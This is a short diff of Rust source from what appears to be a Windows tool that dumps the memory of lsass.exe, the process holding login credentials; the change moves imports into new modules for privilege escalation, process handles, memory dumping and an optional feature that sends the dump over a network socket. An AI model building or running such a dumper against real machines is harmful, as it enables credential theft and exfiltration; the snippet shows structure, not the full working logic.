@@ -2,21 +2,21 @@ use alloc::vec::Vec;
 use core::ffi::c_void;
 
 use crate::{
-    dump::dump_memory_regions,
-    mdfile::{MemoryRegion, ModuleInfo},
-    ntapi::{
-        def::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
-        memory::get_modules_info,
-        privilege::enable_se_debug_privilege,
-        process::get_process_handle_by_name,
+    dumper::{
+        dump::{dump_memory_regions, get_modules_info},
+        mdfile::{MemoryRegion, ModuleInfo},
+    },
+    native::{
+        ntdef::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
+        ntpsapi::{enable_se_debug_privilege, get_process_handle_by_name},
     },
 };
 
-#[cfg(not(feature = "remote"))]
-use crate::ntapi::file::save_file;
-
 #[cfg(feature = "remote")]
 use crate::remote::winsock::send_file;
+
+#[cfg(not(feature = "remote"))]
+use crate::native::ntfile::save_file;
 
 /// Enables SeDebugPrivilege for the process.
 /// This is necessary to access system processes like `lsass.exe`.
@@ -48,7 +48,6 @@ pub fn perform_memory_dump(
     let mut memory64list: Vec<MemoryRegion> = Vec::new();
     let mut memory_regions: Vec<u8> = Vec::new();
 
-    // Unsafe call to dump memory regions of the process.
     unsafe {
         dump_memory_regions(
             process_handle,
